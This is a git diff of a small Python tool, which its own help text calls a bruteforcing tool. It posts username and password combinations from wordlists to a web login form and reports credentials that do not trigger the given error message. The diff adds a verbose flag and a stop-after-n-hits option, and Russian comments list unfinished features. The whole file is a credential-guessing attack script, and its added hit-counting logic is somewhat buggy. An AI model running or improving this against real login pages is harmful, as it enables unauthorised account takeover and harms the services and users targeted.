@@ -2,9 +2,11 @@ import argparse
 import requests
 import sys
 import string
+import time
 
 parser = argparse.ArgumentParser(description = "I developed this tool for bruteforcing...")
 parser.add_argument('-e', '--error_message', help="Message if I used invalid credentials", required=True)
+parser.add_argument('-f', '--first', help="Stop on first n values of valid credentials")
 parser.add_argument('-i', '--ip', help="URL for bruteforcing", required=True, type=str)
 parser.add_argument('-k', '--keys', help="Keys (for example, username,password) from source code", required=True)
 parser.add_argument('-m', '--method', help="Set method gor attack", required=True)
@@ -13,9 +15,10 @@ parser.add_argument('-P', '--passwords', help="List with passwords for attack")
 parser.add_argument('-t', '--threads', help="Enter count threads for bruteforcing", default=1)
 parser.add_argument('-u', '--username', help="Username for authentication", type=str)
 parser.add_argument('-U', '--usernames', help="List with usernames for attack")
+parser.add_argument('-v', '--verbose', help="Start verbose mode", default=False)
 args = parser.parse_args()
 
-# Добавить обработку потоков, считывание данных из файла для опций -U , -P, http_get метод, ssl/tls
+# Добавить обработку потоков, http_get метод, ssl/tls
 # Добавить обработку большего количества параметров
 # Добавить подробный режим
 
@@ -34,6 +37,8 @@ def init_data():
     threads = args.threads
     keys = args.keys.split(",")
     error = args.error_message
+    verbose = args.verbose
+    first = args.first
 
     if args.username == None and args.usernames != None:
         with open(args.usernames, "r") as file:
@@ -63,17 +68,21 @@ def init_data():
         print ("[*] You need to specify -p or -P option.")
         sys.exit()
 
-    return URL, method, threads, keys, error, usernames, passwords
+    return URL, method, threads, keys, error, usernames, passwords, verbose, first
 
-def http_post_brute(usernames, passwords, URL, keys, threads, error):
+def http_post_brute(usernames, passwords, URL, keys, threads, error, verbose, first):
+    count = 0
     for username in usernames:
         for password in passwords:
             data = {keys[0]:username, keys[1]:password}
             response = requests.post(URL, data=data)
 
-            if error not in response.text:
+            if error not in response.text and count < int(first):
+                print (count, first)
                 print (f'[+] Found valid credentials: {username}:{password}')
-                sys.exit() # вербоз мод
+                count += 1
+            elif count == int(first):
+                sys.exit()
             else:
                 print (f'[*] Attempted: {username}:{password}')
     
@@ -90,14 +99,17 @@ def http_get_brute(usernames, passwords, URL, keys, threads, error): # Не ра
                 print (f'[*] Attempted: {username}:{password}')
 
 
-def start_scan(URL, method, threads, usernames, passwords):
+def start_scan(URL, method, threads, usernames, passwords, verbose, first):
     if args.method == 'http_post':
-        http_post_brute(usernames, passwords, URL, keys, threads, error) 
+        http_post_brute(usernames, passwords, URL, keys, threads, error, verbose, first) 
     elif args.method == 'http_get':
         http_get_brute(usernames, passwords, URL, keys, threads, error)
     else:
         pass
 
 if __name__ == "__main__":
-    URL, method, threads, keys, error, usernames, passwords = init_data()
-    start_scan(URL, method, threads, usernames, passwords)
+    URL, method, threads, keys, error, usernames, passwords, verbose, first = init_data()
+    start_scan(URL, method, threads, usernames, passwords, verbose, first)
+
+
+# Дописать вербоз мод
